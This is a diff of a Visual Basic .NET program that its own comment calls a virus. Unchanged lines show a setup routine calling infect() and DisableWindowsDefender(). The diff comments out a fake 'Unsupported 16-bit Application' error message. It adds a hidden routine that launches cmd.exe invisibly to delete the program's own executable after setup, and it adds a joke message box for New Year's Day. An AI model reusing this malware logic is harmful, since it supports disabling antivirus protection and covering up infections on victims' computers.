@@ -13,14 +13,13 @@ Public Class Form1
     Dim InstallPath = UserFoler & "\Denver3"
     Dim DebugMode = False
 
-
     Private Const SPI_SETDESKWALLPAPER As Integer = &H14
     Private Const SPIF_UPDATEINIFILE As Integer = &H1
     Private Const SPIF_SENDWININICHANGE As Integer = &H2
     Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
     Const WallpaperFile As String = "c:\wallpaper.bmp"
     Dim Close1 As Boolean = False
-    Private ReadOnly filePath As String = "first_open.txt"
+
 
     Private Sub DebugScript() 'Code to run on debug mode
 
@@ -57,8 +56,9 @@ Public Class Form1
     Public Sub RunInitialSetup() ' code in this block will only run when the program first starts for the first time after the person has successfully confirmed that they know this is a virus.
         infect()
         DisableWindowsDefender()
-        MsgBox("The program or feature ""\??\" & Application.ExecutablePath & """cannot start or run due to incompatibily with 64-bit versions of Windows. Please contact the software
-vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsupported 16-bit Application")
+        '  MsgBox("The program or feature ""\??\" & Application.ExecutablePath & """cannot start or run due to incompatibily with 64-bit versions of Windows. Please contact the software
+        'vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsupported 16-bit Application")
+
         Try
             Dim path As String = InstallPath & "\Denver3.runtime"
             Dim fs As FileStream = File.Create(path)
@@ -70,7 +70,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         Catch ex As Exception
 
         End Try
-
+        Kill(1)
     End Sub
 
 
@@ -130,7 +130,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             End If
 
             If currentTime.Month = 1 And currentTime.Date.Day = 1 Then
-                TrainIsAFurryLmao.Show()
+                MsgBox("Train is a furry: inside joke in my friend group (c) EEI 2024.")
             End If
 
             If currentTime.Month = 1 And currentTime.Date.Day = 2 Then
@@ -858,6 +858,20 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
         End Try
     End Sub
+
+
+    Private Sub Kill(ByVal Timeout As Integer)
+
+        Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
+        p.Arguments = "/C ping 1.1.1.1 -n 1 -w " & Timeout.ToString & " > Nul & Del """ & Application.ExecutablePath & """"
+        p.CreateNoWindow = True
+        p.ErrorDialog = False
+        p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
+        System.Diagnostics.Process.Start(p)
+        Application.ExitThread()
+    End Sub
+
+
 End Class
 
 Public Class MyUtilities
